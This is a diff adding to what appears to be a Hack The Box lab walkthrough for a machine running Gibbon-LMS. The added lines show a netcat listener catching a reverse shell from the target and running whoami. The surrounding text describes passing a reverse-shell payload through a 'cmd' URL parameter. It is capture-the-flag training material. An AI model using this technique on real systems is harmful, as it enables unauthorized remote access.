@@ -81,7 +81,16 @@ Noice! So, we can now execute commands and get a reverse shell! You can simply g
 ![[Pasted image 20250829190724.png]]
 
 We can then listen on our local machine and send the above text as argument of `cmd`. Remember that we need to substitute "space" with "+" as you cannot pass white space in URL parameters. Send the request and you have the reverse shell 🎉.
+```
+─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/thefrizz]
+└──╼ [★]$ rlwrap nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.11.60 51511
 
+PS C:\xampp\htdocs\Gibbon-LMS> 
+PS C:\xampp\htdocs\Gibbon-LMS> whoami
+frizz\w.webservice
+```
 
 
 
